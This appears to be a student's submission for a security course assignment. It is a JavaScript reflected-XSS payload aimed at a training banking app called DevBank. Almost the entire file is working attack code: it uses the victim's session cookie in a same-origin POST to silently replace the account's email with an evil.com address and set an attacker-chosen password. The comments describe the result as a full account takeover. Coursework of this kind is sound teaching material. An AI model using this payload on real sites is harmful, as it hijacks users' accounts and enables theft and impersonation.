// FIT5003 Assignment 2 - Part B.2 (reflected XSS -> account takeover)
// Student: 36791156
//
// This script is injected into DevBank via the reflected XSS in /search, so it
// runs in the VICTIM's browser, on DevBank's own origin. Because it is same-origin,
// the victim's session cookie is sent automatically with the request below - no
// password needed. It silently changes the victim's profile email AND password,
// so the attacker now controls the account (a full account takeover).

fetch("/profile", {
  method: "POST",
  headers: { "Content-Type": "application/x-www-form-urlencoded" },
  credentials: "same-origin",                 // send the victim's session cookie
  body: "email=attacker-36791156@evil.com&password=pwned-36791156"
})
  .then(function () {
    // Visible proof for the demo that the payload ran and changed the account.
    alert("Account taken over by 36791156 - email & password changed");
  });
